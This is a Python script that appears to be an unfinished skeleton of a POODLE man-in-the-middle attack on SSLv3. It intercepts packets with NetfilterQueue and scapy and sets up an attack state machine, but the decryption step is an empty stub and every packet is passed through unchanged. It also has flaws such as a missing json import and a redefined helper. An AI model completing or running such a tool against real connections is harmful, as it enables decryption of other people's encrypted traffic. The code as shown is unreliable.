from netfilterqueue import NetfilterQueue
from scapy.all import *
from scapy.layers.tls.all import TLS
from scapy.layers.http import *
from scapy.layers.tls import *
from socketserver import ThreadingMixIn
from scapy.all import IP, TCP
from http.server import HTTPServer, BaseHTTPRequestHandler
from utils.modify_and_send_packet import modify_and_send_packet
from utils.is_sslv3_packet import is_sslv3_packet
from utils.get_field import get_field
from scapy.layers.inet import IP, TCP

config = json.load(open('config.json'))

def get_field(layer, field_name):
    return layer.get_field(field_name).i2repr(layer, getattr(layer, field_name))


def attack_callback(packet):
    pkt = IP(packet.get_payload())

    if not TLS in pkt:
        packet.accept()
        return

    if not is_sslv3_packet(pkt):
        packet.accept()
        return

    # サーバー側からの判定を見るだけなので、clientからのパケットは気にする必要がない
    if pkt.src == config['client']:
        packet.accept()
        return
    print(get_field(pkt.getlayer(TLS),'type') == "application_data")



    victim = POODLEAttack()

    print(get_field(pkt.getlayer(TLS),'type') == "application_data")






    packet.accept()


class POODLEAttack:
    STATE_PADDING = 1
    STATE_DECRYPT = 2
    STATE_DECRYPT_MODIFIED = 3
    STATE_FINISHED = 100


    def __init__(self):
        self.state = POODLEAttack.STATE_PADDING

    def decryptByte(self,appData):
        pass

    def checkTLSRecord(self,record):
        if self.state == POODLEAttack.STATE_DECRYPT_MODIFIED:
            if record == "handshake":
                self.state = POODLEAttack.STATE_DECRYPT
            elif record == "application_data":
                self.decryptByte(self.changedData)
                self.state = POODLEAttack.STATE_DECRYPT






try:
    nfqueue = NetfilterQueue()
    nfqueue.bind(0, attack_callback)
    nfqueue.run()
except KeyboardInterrupt:
    pass

nfqueue.unbind()
